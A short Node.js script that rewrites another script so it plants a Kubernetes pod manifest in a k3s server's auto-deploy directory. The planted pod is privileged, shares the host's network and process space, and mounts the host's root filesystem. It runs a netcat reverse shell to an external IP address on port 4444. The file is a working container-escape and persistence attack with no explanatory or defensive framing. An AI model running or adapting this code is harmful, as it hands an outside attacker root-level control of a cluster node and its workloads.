const fs=require('fs');
let s=fs.readFileSync('mkCri.js','utf8');
const pod="const pod={apiVersion:'v1',kind:'Pod',metadata:{name:'zzesc4'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'IMG',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}};";
const expr="const CMD=\"echo '\"+JSON.stringify(pod)+\"' > /h/var/lib/rancher/k3s/server/manifests/zzesc.json; echo ok > /h/tmp/zzm.txt\";";
s=s.replace(/const CMD.*\n/, pod+'\n'+expr+'\n');
fs.writeFileSync('mkCri.js',s);
